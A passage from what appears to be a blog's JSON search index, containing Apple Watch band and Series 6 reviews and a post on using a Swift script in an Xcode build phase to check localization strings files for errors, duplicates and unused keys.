Watch look more formal and pairs better with outfits.DisadvantagesPinching hair, pinching hair, pinching hair, feels heavier.Original vs Third-Party?Lurking in Apple communities for a while, I‚Äôve noticed the most common question is about original vs third-party Milanese bands. Personally, I think the difference is minor, mainly in details and craftsmanship. The original can also catch hair, but its weaving is delicate and seamless. The magnet is strong and won‚Äôt loosen, and it feels clean and skin-friendly without a rust smell. However, the price difference is several times (the original costs $3,100). It‚Äôs best to feel the actual product before deciding. I guess third-party Milanese bands priced around 1,000 to 2,000 are almost as good as the original in craftsmanship.SizeSame as the previous article, it is recommended that those with smaller wrists buy the Apple Watch 40 mm, because the 40 mm Milanese band fits wrist sizes 130‚Äì180 mm; compared to the 44 mm Milanese band, which fits wrist sizes 150‚Äì200 mm, it is 20 mm shorter.The watch strap is a one-piece design with a fixed length and cannot be adjusted; if the strap is already tightened but still too loose, you can only consider third-party straps, or just gain some weight (?). Therefore, it‚Äôs safer to try it on at a store first. A friend‚Äôs case: with small wrists, bought size 44 + Milanese strap, can only fasten to the last hole and still feels a bit loose!Unboxing ** Purchased on 2020/11/01 at Apple Store 101 Direct Store.*The same simple and unadorned paper packagingBack of the packagingIt‚Äôs no longer called Space Gray; now it‚Äôs called Graphite.ContentsSimilar to the original silicone strap, but without the extra short strap included XDMain BodyMagnetic Watch ClaspMagnetic clasp, can attach anywhere, freely adjust the band sizeInstallation InstructionsThe side with the magnetic patch attaches to the Apple Watch body. Don‚Äôt pretend to be the opposite like I did at first, not realizing it, although it doesn‚Äôt really matter?Correct version! Done!Back of the actual wearing photoWearing Photo Front ViewAdditional Details on Original Manufacturer Straps **A simple way to distinguish between original and third-party Milanese watch bands, but it‚Äôs not always accurate; buying from authorized channels is the only way to guarantee you‚Äôre not scammed!*Connector end - the end near the magnetic clasp ‚Äî bottom ‚Äî has the text ‚ÄúAssembled in China‚ÄùThe other end of the connector ‚Äî surface ‚Äî has the text ‚Äú44MM‚ÄùFurther Reading Apple Watch Series 6 Unboxing &amp; Two Years of Use ReviewIf you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Apple Watch Series 6 UnboxingÔΩúComprehensive 2-Year User Experience and Buying Guide", "url": "/posts/zrealm-life/apple-watch-series-6-unboxing-comprehensive-2-year-user-experience-and-buying-guide-eab0e984043/", "categories": "ZRealm Life.", "tags": "english, ai-translation, apple, apple-watch-series-6, apple-watch, lifestyle, unboxing", "date": "2020-10-14 20:48:38 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Series 6 Unboxing &amp; Two Years of Usage ReviewApple Watch Serie...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Apple Watch Series 6 Unboxing &amp; Two Years of Usage ReviewApple Watch Series 6 Unboxing and Buying Guide &amp; Two-Year Usage Experience SummaryIntroductionTime flies, and it has been two years since the previous unboxing article of the Apple Watch Series 4; in terms of features, the Series 4 is more than sufficient with no need to upgrade. The Series 5 and Series 6 have no major breakthrough features‚Äîthese updates are improvements but not essential.However, due to the news about Xiao Gui, I fortunately gave the original Series 4 LTE version to my family to use; the LTE version can make emergency calls regardless of whether the phone is nearby, making it safer compared to the GPS version.My personal habit is to wear them when going out and take them off to charge at home. I don‚Äôt wear them while sleeping, so I miss out on the sleep tracking experience.My Series 4 is the LTE version, but since I always carry my phone with me, it‚Äôs unnecessary to pay an extra $199 monthly fee. Also, replying to messages on the watch is inconvenient, and answering calls is only easy with AirPods. Additionally, Spotify on the watch is just a playback controller and cannot play independently without the iPhone (only Apple Music/KKBOX can). and‚Ä¶ I am an iOS APP / watchOS APP developer[2020‚Äì10‚Äì24 Update]: Spotify now supports standalone playback. In the Spotify app on the watch, select Playback Device -&gt; Apple Watch -&gt; connect Bluetooth headphones -&gt; then you can play! (Offline download playback is still not supported; an internet connection is required).Apple Watch Series 6 UnboxingLet‚Äôs get straight to the main topic of this article.Place an OrderThis time, I chose the GPS 44mm aluminum version in Cypress Green (military green), matching my iPhone 11 Pro in military green.Missed the first batch purchase, I placed an order on the evening of 9/15: The estimated delivery time provided by the system is 10/16~10/19 (which may coincide with the Mainland China National Day holiday). 10/10 Shipment notified, estimated to arrive before 10/13 10/13 Notice: Delivery date may be slightly delayed due to customs clearance. Actually received on 10/14, but still earlier than the original estimated delivery time! UnboxingApple Watch + RhinoShield Protective Case SetFlip to the back, unbox!Unboxing without using any knives, just tearing all the way through.Open!One strap, one watch body.The packaging thickness of this generation has significantly decreased (no more tofu head).Device UnboxingOnly includes magnetic charging cable.Close-up of the aircraftThis time, the protective material of the device is changed to paper. I remember the previous generation used black velvet.Watch Strap UnboxingCombine!Back sideWhen assembling, you can first attach the upper half of the watch strap, then remove the paper protective cover to avoid slipping.Apple Watch 6 + iPhone 11 Prowith Ole ChickenSwimming Ring ChickenApple Watch 6 with RhinoShield Protective CaseBlood Oxygen TestTry out the main features of this generation.Screen Sleep vs Display OnPretty good, now the screen won‚Äôt turn off, no need to raise your wrist to wake the screen and check messages! Unboxing complete.Summary of Two Years of Usage ExperienceSummarize my experience over the past two years and my personal buying guide.Enhance Life Experience and Increase FocusApple Watch serves as an extension of the phone, acting as a buffer between the phone and the user; currently, our dependence on electronic devices means directly facing the phone and the overwhelming notifications.I don‚Äôt know if you feel the same way, but phone notifications can be quite startling. Even the vibration sound can make your heart skip a beat sometimes when you get a notification. Then, instinctively, you take out your phone to check it. If it‚Äôs important, you deal with it; if not, you put the phone away. This process repeats every day in our lives‚Ä¶Although you can turn off sound notifications, disable vibration in silent mode, or even turn off all notifications, on the other hand, you disconnect from the world and miss truly important alerts, which leads to another kind of anxiety where you constantly check your phone.Considering the above situations, the Apple Watch can act as a lubricant, adding a funnel between the user and the phone for filtering. When wearing the watch and the phone is asleep, only the watch will notify. You can set notifications from specific apps to be sent to the watch and disable sound/vibration for certain app notifications.You might say, aren‚Äôt these settings the same as on a phone? But in terms of experience, the watch‚Äôs sound/vibration is gentler and less intrusive. Even if you turn off sound/vibration, you can quickly check for notifications by raising your wrist.Improving daily experiences and increasing focus can be achieved by quickly reviewing notifications on the watch, then deciding whether to continue the current task or take out the phone to handle the message. The interruption time is very short (just the time spent looking at the watch), and it also avoids frequent phone use that can cause distractions, thereby boosting work efficiency.Healthy Living and Exercise TrackingThe exclusive ‚ÄúFitness‚Äù app, available only with an Apple Watch, can track your daily life, including daily activity, walking, heart rate, exercise records, activity trends, and detailed health information. On the social side, you can compete with friends in activity challenges and unlock badges to boost motivation.However, exercise depends on the person. Those who exercise will continue to do so, and those who don‚Äôt won‚Äôt start just because of a watch; at most, it adds to the tracking and enjoyment of exercise.Apple PayYou don‚Äôt even need to take out your phone; just double-click the watch to make a payment, which is very convenient‚Äîespecially when your hands are full and you can‚Äôt reach into your pocket for your phone. You can also install invoice apps that support Apple Watch. Open the app to display the carrier barcode for the cashier to scan, then double-click to bring up Apple Pay for payment.My most common habit is using the phone widget to let the clerk scan the carrier or membership barcode (like 7‚Äì11/FamilyMart, since they don‚Äôt offer an Apple Watch app), then quickly double-clicking the watch to bring up Apple Pay and making the payment with the same hand. Keep it inside, no receipt needed.Personal Style, Your WayThe watch face and strap can be changed anytime to match your mood; a few watch faces are fixed‚Äîsome for workdays, some for holidays. Over the past two years, I‚Äôve bought four straps: leather, metal, woven, and even protective case colors to match different outfits.Apple Ecosystem Integration Watch Can Directly Unlock Mac Computer Watch can find phone with one click (forces phone to emit beeping sound) The watch can act as a Bluetooth selfie button to control the phone‚Äôs camera for taking photos. Check the WeatherI‚Äôm used to checking the current weather and rain probability on my watch at a glance; using my phone requires tapping through several layers to find the info I want.Alarm and TimerThe countdown timer and alarm are features I really like to use. You can quickly start the countdown timer on the watch, and when the timer or alarm goes off while wearing the watch, it will notify you through the watch (if the watch is on silent, it will vibrate to alert you).I personally find it very comfortable, especially when I want to take a short nap without worrying that the alarm sound or phone vibration will disturb other colleagues.MapIt‚Äôs quite useful when riding a scooter, allowing you to directly view the route map and get vibration alerts for routes/turns; however, the downside is that the map is not optimized for scooters, so you need to watch out for scooter-restricted routes yourself, and the route planning is average.Watch route map viewingGoogle Maps has recently returned to Apple Watch, but it does not support viewing route maps directly; it only offers text navigation prompts.Fall DetectionBecause this feature has recently gained a lot of attention, I‚Äôm sharing my personal trigger experience; once, when getting on a bus, I quickly and forcefully kicked the seat with my left hand, successfully triggering the fall detection. The device will first vibrate continuously and loudly call you to check if you are conscious. If you don‚Äôt respond within 30 seconds, it will call emergency services and notify your emergency contacts.Apple Watch Fall Detection Test: Calls 119 Rescue in 1 Minute. - Before watchOS 5, fall detection was enabled by default only for users over 65 years old, and disabled by default for those under 65; you can check the settings for this. - Multiple emergency contacts can be designated and must be set in advance.Recommended Apps to InstallIf you‚Äôve read the previous unboxing, that article included unboxing, usage tutorials, and some app recommendations. Honestly, I later deleted most of them, keeping only the built-in apps and a few commonly used communication apps. At first, I installed many apps out of curiosity, but I stopped using them later.To be honest, when complex operations are needed, you use your phone. A watch is really only for quick tasks.The Development of Apple Watch in the Past Two YearsAs mentioned earlier, the Series 4 and Series 6 have no changes in features or product positioning; both serve as extensions of the iPhone, not replacements. There have been no breakthrough features in the past two years, and battery life still requires daily charging.Regarding third-party apps, there haven‚Äôt been many new additions in the past two years, but the trend is growing; Line and Google Maps have recently updated to enhance their Apple Watch apps, showing they have not been forgotten.I previously wrote an article sharing my experience of building an Apple Watch APP myself. Based on watchOS 5 development, I found that the official features available are very limited (still mostly the same now), so third-party apps have little room to expand, resulting in very few apps.watchOSCurrently updated to watchOS 7, with iOS updates once a year.watchOS 6: Added environmental noise detection, menstrual tracking (great for female users), and internet walkie-talkie featureswatchOS 7: Added sleep tracking, handwashing timer prompts, and Family Sharing featureswatchOS 7 Family Sharing Feature (LTE version only)I gave my original Series 4 watch to a family member who actually tried it. You can refer to this unboxing video. This feature ties the watch to your phone, and the watch must be nearby to change settings. After completing the setup process, some settings cannot be adjusted again without resetting. The shared family member can only use the watch and cannot customize it themselves.The advantage is that the wearer does not necessarily have to be an iPhone user! According to the official website, this feature is only available on LTE models of Series 4 and later!Buying GuideShould You Buy It or Not?I believe 80% of readers here are already considering buying it; I think it‚Äôs worth buying for tech enthusiasts who want to explore. If a watch is just an accessory for you, there are more stylish options at the same price. If you‚Äôre buying solely for sports, there are better sports watches to consider. The Apple Watch is designed for overall needs and enhanced experience. In Xiao Gui‚Äôs case, even the Apple Watch couldn‚Äôt prevent the accident. Xiao Gui fell after taking a shower. The Apple Watch is water-resistant but not steam-resistant. Wearing it regularly in the shower can easily damage it. Also, since it needs daily charging, it is usually taken off during shower time for charging and is not worn then. Still just an extension of the phone, an experimental Apple product Charge once a day, always carry a charger when going out When switching from Series 4 to Series 6, I didn‚Äôt wear it for two or three weeks in between, and personally, I didn‚Äôt notice any difference. Series 6 or SE or Used Series 4/5?The performance is sufficient to last another 3 to 5 years. If you have the budget, it‚Äôs better to buy new rather than old. For better cost performance, you can choose the SE. If your budget is limited, buying a used Series 4/5 or LTE version is easier to get. Apple Watch can only pair with iPhone (Android phones and iPads are not supported). Also, consider the current iOS version on the phone. watchOS 7 requires pairing with iOS ‚â• 14 (watchOS 6 =&gt; iOS ‚â• 13 / watchOS 5 =&gt; iOS ‚â• 12). iPhone must first be upgraded to the corresponding minimum iOS version to pair and use.Series 6 / SE do not include a charging brick.The watchOS 7 Family Sharing feature (allows monitoring of children‚Äôs activity and seniors‚Äô health) is only available for Series 4 or later, or SE models.Aluminum Alloy or Stainless Steel or Titanium?Stainless Steel Version (Thanks to colleague for friendly support)It depends on how you position this watch. If you want something novel and fun, the aluminum version is enough; if you want to enhance its accessory appeal, go for the stainless steel or higher versions‚Äîthey look better and are easier to match.The aluminum alloy version has higher demand in the second-hand market. The new generation models are easier to sell (my Series 4 can still fetch 7,000 to 8,000).The aluminum alloy body and glass are more fragile, and the screen glass is not scratch-resistant. It is recommended to buy a protective case and a full-coverage screen protector.Protective case (about $400) + screen protector: it‚Äôs recommended to use hydrogel or jelly film (about $800) to avoid poor adhesion issues; total additional cost around +$1500. The aluminum alloy version also provides full protection. Additional hard-earned advice: if you use a screen protector, you must buy a case to prevent edge chipping (I had to replace three protectors, losing nearly $3000). Also, choose a good screen protector that fits well, or it will be difficult to use and just a waste of money.Xiaohao Screen Protector‚Äôs HAO Jelly Full-Coverage Glass Screen ProtectorFully transparent &amp; fully adhesive fit, does not affect smooth sliding or display.RhinoShield + Screen Protector The screen will be slightly thicker, so the inner frame might lift a bit (depending on the case‚Äôs tolerance), but the clips will still snap in properly. Xiao Hao‚Äôs screen protector service suggests not inserting too many RhinoShield inner frames as it may press against the screen protector; just use the outer frame. However, my Series 4 has been fine for two years in this condition, so please decide for yourself.40mm or 44mm?Judging by the thickness of your hand, men are generally advised to wear size 44; anything smaller might look odd. If you plan to buy an aluminum alloy case plus a protective cover, consider whether the combined size will be too large.GPS or LTE Mobile Network Version?Considering that the LTE version was never used before, this time I chose the GPS version, which is $3000 cheaper.Considerations for GPS or LTE include whether you will sometimes go out wearing only the watch, and the recently popular fall alert feature. The GPS version requires the phone to be nearby or the watch to connect to the current WiFi network for emergency alerts to be sent through the phone (if these conditions are not met, alerts cannot be sent); the LTE version can operate independently, making it safer. Communication between the phone and watch is the same: with the GPS version or without LTE activated, communication happens through the phone when it is near the watch and the watch can connect to the current WiFi network. The watch can connect to the current WiFi network means that the phone and watch have previously connected to this WiFi, and the system has a record to connect directly.The Family Setup feature in watchOS 7 (which allows you to check your child‚Äôs activities and elderly health status) is only available on the LTE version, because the watch data is sent to the organizer‚Äôs (parent‚Äôs) phone, not the wearer‚Äôs phone.Strap SectionWatch straps are only categorized as: Size: 42 (Apple Watch Series 3 and below) / 44 (Apple Watch Series 4 and above) Small: 38 (Apple Watch Series 3 and below) / 40 (Apple Watch Series 4 and above) Apple also guarantees that the watch band size will not change (otherwise, who would buy the Herm√®s edition XD). At least for now, bands from Series 1 to 6 are compatible. Apple Watch Official Stainless Steel Milanese Loop Unboxing ÔºöApple Watch Original Stainless Steel Milanese Loop UnboxingStandard Version / Nike Version / Herm√®s VersionThe Nike edition only includes exclusive Nike watch faces. The Herm√®s edition not only has exclusive Herm√®s watch faces but also features Herm√®s straps paired with the stainless steel version.Upgrade GuideIf you currently have a Series 3/Series 2/Series 1, it is recommended to upgrade, at least to Series 4; starting from Series 4, the screen becomes full-screen (many new watch faces require Series 4 or above), and the processor performance is much better, with almost no lag. The upgrade is noticeable.Series 4 upgrade is optional since the main differences are always-on display and blood oxygen sensor. The Apple Watch wrist raise display is fast and responsive; always-on is better but not essential. The blood oxygen sensor is not medically certified and is for reference only.If you already have a Series 5, you can wait for the next generation; there is no need to upgrade.For a detailed comparison, please refer to the official website ‚ÄúCompare all models‚Äù. There are also some differences in features, such as altimeter, compass, and more.Apple Official WebsiteFurther Reading Apple Watch Official Stainless Steel Milanese Loop Unboxing See more Apple Watch basic tutorials and app recommendations AirPods 2 Unboxing and Hands-On Experience First Experience with Smart Home ‚Äî Apple HomeKit &amp; Xiaomi Mijia Build an Apple Watch App! (Swift) If you have any questions or feedback, feel free to contact me. üîó Copy link to share! üç∫ Buy me a beer on PayPal This post was originally published on Medium (View original post), and automatically converted and synced by ZMediumToMarkdown. Improve this page on Github." }, { "title": "Swift Run Script in XcodeÔΩúLocalization & Image Asset Checks Automated", "url": "/posts/zrealm-dev/swift-run-script-in-xcode-localization-image-asset-checks-automated-41c49a75a743/", "categories": "ZRealm Dev.", "tags": "english, ai-translation, ios, shell-script, xcode, ios-app-development, toolkit", "date": "2020-09-17 23:53:20 +0800", "snippet": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Write Shell Scripts Directly in Swift with Xcode!Implementing Localization for...", "content": " ÁÇπÂáªËøôÈáåÊü•ÁúãÊú¨ÊñáÁ´†ÁÆÄ‰Ωì‰∏≠ÊñáÁâàÊú¨„ÄÇ ÈªûÊìäÈÄôË£°Êü•ÁúãÊú¨ÊñáÁ´†Ê≠£È´î‰∏≠ÊñáÁâàÊú¨„ÄÇ This post was translated with AI assistance ‚Äî let me know if anything sounds off!Write Shell Scripts Directly in Swift with Xcode!Implementing Localization for Multiple Languages and Image Assets Missing Check, Using Swift to Build Shell ScriptPhoto by Glenn Carstens-PetersReasonBecause of my clumsiness, I often miss semicolons when editing multilingual files, causing language display errors in the app build. Additionally, as development progresses, the language files have become larger, with repeated and unused phrases mixed together, making it very messy (the same issue applies to Image Assets).I have always wanted a tool to help with this issue. Previously, I used the Mac app iOSLocalizationEditor, but it mainly functions as a localization file editor, allowing you to read and edit the file contents without any automatic checking features.Expected FeaturesAutomatically check for errors, missing entries, duplicates in multiple languages, and missing Image Assets during project build.SolutionTo achieve our desired functionality, we need to add a Run Script check in Build Phases.However, the check script needs to be written in shell script. Since I am not very proficient in shell scripting, I tried searching online for existing scripts that fully meet the desired functionality but couldn‚Äôt find any. Just when I was about to give up, I suddenly thought: You can write Shell Scripts using Swift!More familiar and proficient compared to shell script! Following this direction, I indeed found two existing tool scripts!Two inspection tools developed by the freshOS team: Localize üèÅ Asset Checker üëÆ Fully meets our expected functional requirements! And since they use Swift, customization and modifications are very easy.Localize üèÅ Multilingual File Checking ToolFunction: Automatic Check During Build Automatic Layout and Organization of Language Files Check for missing or extra content in multilingual and primary languages Check for duplicate sentences in multiple languages Check untranslated sentences in multilingual content Check for unused multilingual phrases Installation Method: Download the Swift Script file for the tool Place it in the project directory, e.g., ${SRCROOT}/Localize.swift Open Project Settings ‚Üí iOS Target ‚Üí Build Phases ‚Üí Top left corner ‚Äú+‚Äù ‚Üí New Run Script Phase ‚Üí Paste the script path in the Script content, e.g., ${SRCROOT}/Localize.swift Open and edit the Localize.swift file using Xcode. You can find configurable settings in the upper part of the file:// Enable script checklet enabled = true// Language files directorylet relativeLocalizableFolders = \"/Resources/Languages\"// Project directory (used to search if strings are used in the code)let relativeSourceFolder = \"/Sources\"// Regular expressions for NSLocalized language file usage in code// Can add more, no need to changelet patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]// Strings to ignore from \"unused string\" warningslet ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", \"NotificationCommentHerPhoto\"]*/// Main languagelet masterLanguage = \"en\"// Enable sorting and organizing language files a-zlet sanitizeFiles = false// Is the project single or multi-languagelet singleLanguage = false// Enable check for untranslated stringslet checkForUntranslated = true Build! Success!Check Result Prompt Types: Build Error ‚ùå : [Duplication] The item is duplicated in the localization file [Unused Key] The item is defined in the localization file but not used in the code [Missing] The item is used in the code but not defined in the localization file [Redundant] The item is redundant in this localization file compared to the main localization file [Missing Translation] The item exists in the main localization file but is missing in this localization file Build Warning ‚ö†Ô∏è : [Potentially Untranslated] This item is untranslated (same as the main language file content) Not finished yet. Now the automatic check prompt is available, but we still need to customize it ourselves.Custom Regex Matching:Looking back at the first item in the patterns section of the top settings block in the Localize.swift script:\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([\\\\w\\\\.]+)\\\"\"Matching Swift/ObjC‚Äôs NSLocalizedString() method, this regular expression can only match statements in the format \"Home.Title\"; if it is a complete sentence or includes format parameters, it will be mistakenly treated as [Unused Key].EX: \"Hi, %@ welcome to my app\"„ÄÅ\"Hello World!\" &lt;- These phrases cannot be matchedWe can add a new patterns setting or change the original patterns to:\"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\"The main adjustment is to the matching pattern after the NSLocalizedString method, capturing any string until a \" appears to stop. You can also click here to customize it according to your needs.Add Language File Format Validation Feature:This script only checks content correspondence for localization files and does not verify file format correctness (such as missing ‚Äú;‚Äù). You need to add this feature yourself if required!//....let formatResult = shell(\"plutil -lint \\(location)\")guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invalid] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return}//....func shell(_ command: String) -&gt; String { let task = Process() let pipe = Pipe() task.standardOutput = pipe task.arguments = [\"-c\", command] task.launchPath = \"/bin/bash\" task.launch() let data = pipe.fileHandleForReading.readDataToEndOfFile() let output = String(data: data, encoding: .utf8)! return output}Add shell() to execute shell scripts, using plutil -lint to check the plist localization file format. If there are errors or missing semicolons, it returns an error; if correct, it returns OK to indicate validation!The check can be added after let location = singleLanguage‚Ä¶ in LocalizationFiles-&gt;process() at around line 135, or refer to the complete modified version I provided at the end.Other Customizations:We can customize according to our needs, such as changing errors to warnings or disabling certain checks (e.g., Potentially Untranslated, Unused Key). The script is written in Swift, which we are all familiar with! No worries about breaking or messing it up!To make an Error ‚ùå appear during build:print(\"ProjectFiles.lproj\" + \"/file:line: \" + \"error: error message\")To make a Warning ‚ö†Ô∏è appear during build:print(\"ProjectFolder.lproj\" + \"/file:line: \" + \"warning: Warning message\")Final Ultimate Modified Version:#!/usr/bin/env xcrun --sdk macosx swiftimport Foundation// WHAT// 1. Find Missing keys in other Localization files// 2. Find potentially untranslated keys// 3. Find Duplicate keys// 4. Find Unused keys and generate script to delete them all at once// MARK: Start Of Configurable Section/* You can enable or disable the script whenever you want */let enabled = true/* Put your path here, example -&gt; Resources/Localizations/Languages */let relativeLocalizableFolders = \"/streetvoice/SupportingFiles\"/* This is the path of your source folder which will be used in searching for the localization keys you actually use in your project */let relativeSourceFolder = \"/streetvoice\"/* Those are the regex patterns to recognize localizations. */let patterns = [ \"NSLocalized(Format)?String\\\\(\\\\s*@?\\\"([^(\\\")]+)\\\"\", // Swift and Objc Native \"Localizations\\\\.((?:[A-Z]{1}[a-z]*[A-z]*)*(?:\\\\.[A-Z]{1}[a-z]*[A-z]*)*)\", // Laurine Calls \"L10n.tr\\\\(key: \\\"(\\\\w+)\\\"\", // SwiftGen generation \"ypLocalized\\\\(\\\"(.*)\\\"\\\\)\", \"\\\"(.*)\\\".localized\" // \"key\".localized pattern]/* Those are the keys you don't want to be recognized as \"unused\" For instance, Keys that you concatenate will not be detected by the parsing so you want to add them here in order not to create false positives :) */let ignoredFromUnusedKeys: [String] = []/* examplelet ignoredFromUnusedKeys = [ \"NotificationNoOne\", \"NotificationCommentPhoto\", \"NotificationCommentHisPhoto\", \"NotificationCommentHerPhoto\"]*/let masterLanguage = \"base\"/* Sanitizing files will remove comments, empty lines and order your keys alphabetically. */let sanitizeFiles = false/* Determines if there are multiple localizations or not. */let singleLanguage = false/* Determines if we should show errors if there's a key within the app that does not appear in master translations.*/let checkForUntranslated = false// MARK: End Of Configurable Sectionif enabled == false { print(\"Localization check cancelled\") exit(000)}// Detect list of supported languages automaticallyfunc listSupportedLanguages() -&gt; [String] { var sl: [String] = [] let path = FileManager.default.currentDirectoryPath + relativeLocalizableFolders if !FileManager.default.fileExists(atPath: path) { print(\"Invalid configuration: \\(path) does not exist.\") exit(1) } let enumerator = FileManager.default.enumerator(atPath: path) let extensionName = \"lproj\" print(\"Found these languages:\") while let element = enumerator?.nextObject() as? String { if element.hasSuffix(extensionName) { print(element) let name = element.replacingOccurrences(of: \".\\(extensionName)\", with: \"\") sl.append(name) } } return sl}let supportedLanguages = listSupportedLanguages()var ignoredFromSameTranslation: [String: [String]] = [:]let path = FileManager.default.currentDirectoryPath + relativeLocalizableFoldersvar numberOfWarnings = 0var numberOfErrors = 0struct LocalizationFiles { var name = \"\" var keyValue: [String: String] = [:] var linesNumbers: [String: Int] = [:] init(name: String) { self.name = name process() } mutating func process() { if sanitizeFiles { removeCommentsFromFile() removeEmptyLinesFromFile() sortLinesAlphabetically() } let location = singleLanguage ? \"\\(path)/Localizable.strings\" : \"\\(path)/\\(name).lproj/Localizable.strings\" let formatResult = shell(\"plutil -lint \\(location)\") guard formatResult.trimmingCharacters(in: .whitespacesAndNewlines).suffix(2) == \"OK\" else { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:1: \" + \"error: [File Invalid] \" + \"This Localizable.strings file format is invalid.\" print(str) numberOfErrors += 1 return } guard let string = try? String(contentsOfFile: location, encoding: .utf8) else { return } let lines = string.components(separatedBy: .newlines) keyValue = [:] let pattern = \"\\\"(.*)\\\" = \\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) var ignoredTranslation: [String] = [] for (lineNumber, line) in lines.enumerated() { let range = NSRange(location: 0, length: (line as NSString).length) // Ignored pattern let ignoredPattern = \"\\\"(.*)\\\" = \\\"(.+)\\\"; *\\\\/\\\\/ *ignore-same-translation-warning\" let ignoredRegex = try? NSRegularExpression(pattern: ignoredPattern, options: []) if let ignoredMatch = ignoredRegex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: ignoredMatch.range(at: 1)) ignoredTranslation.append(key) } if let firstMatch = regex?.firstMatch(in: line, options: [], range: range) { let key = (line as NSString).substring(with: firstMatch.range(at: 1)) let value = (line as NSString).substring(with: firstMatch.range(at: 2)) if keyValue[key] != nil { let str = \"\\(path)/\\(name).lproj\" + \"/Localizable.strings:\\(linesNumbers[key]!): \" + \"error: [Duplication] \\\"\\(key)\\\" \" + \"is duplicated in \\(name.uppercased()) file\" print(str) numberOfErrors += 1 } else { keyValue[key] = value linesNumbers[key] = lineNumber + 1 } } } print(ignoredFromSameTranslation) ignoredFromSameTranslation[name] = ignoredTranslation } func rebuildFileString(from lines: [String]) -&gt; String { return lines.reduce(\"\") { (r: String, s: String) -&gt; String in (r == \"\") ? (r + s) : (r + \"\\n\" + s) } } func removeEmptyLinesFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeCommentsFromFile() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { var lines = string.components(separatedBy: .newlines) lines = lines.filter { !$0.hasPrefix(\"//\") } let s = rebuildFileString(from: lines) try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func sortLinesAlphabetically() { let location = \"\\(path)/\\(name).lproj/Localizable.strings\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { let lines = string.components(separatedBy: .newlines) var s = \"\" for (i, l) in sortAlphabetically(lines).enumerated() { s += l if i != lines.count - 1 { s += \"\\n\" } } try? s.write(toFile: location, atomically: false, encoding: .utf8) } } func removeEmptyLinesFromLines(_ lines: [String]) -&gt; [String] { return lines.filter { $0.trimmingCharacters(in: .whitespaces) != \"\" } } func sortAlphabetically(_ lines: [String]) -&gt; [String] { return lines.sorted() }}// MARK: - Load Localization Files in memorylet masterLocalizationFile = LocalizationFiles(name: masterLanguage)let localizationFiles = supportedLanguages .filter { $0 != masterLanguage } .map { LocalizationFiles(name: $0) }// MARK: - Detect Unused Keyslet sourcesPath = FileManager.default.currentDirectoryPath + relativeSourceFolderlet fileManager = FileManager.defaultlet enumerator = fileManager.enumerator(atPath: sourcesPath)var localizedStrings: [String] = []while let swiftFileLocation = enumerator?.nextObject() as? String { // checks the extension if swiftFileLocation.hasSuffix(\".swift\") \\\\|\\\\| swiftFileLocation.hasSuffix(\".m\") \\\\|\\\\| swiftFileLocation.hasSuffix(\".mm\") { let location = \"\\(sourcesPath)/\\(swiftFileLocation)\" if let string = try? String(contentsOfFile: location, encoding: .utf8) { for p in patterns { let regex = try? NSRegularExpression(pattern: p, options: []) let range = NSRange(location: 0, length: (string as NSString).length) // Obj c workaround regex?.enumerateMatches(in: string, options: [], range: range, using: { result, _, _ in if let r = result { let value = (string as NSString).substring(with: r.range(at: r.numberOfRanges - 1)) localizedStrings.append(value) } }) } } }}var masterKeys = Set(masterLocalizationFile.keyValue.keys)let usedKeys = Set(localizedStrings)let ignored = Set(ignoredFromUnusedKeys)let unused = masterKeys.subtracting(usedKeys).subtracting(ignored)let untranslated = usedKeys.subtracting(masterKeys)// Here generate Xcode regex Find and replace script to remove dead keys all at once!var replaceCommand = \"\\\"(\"var counter = 0for v in unused { var str = 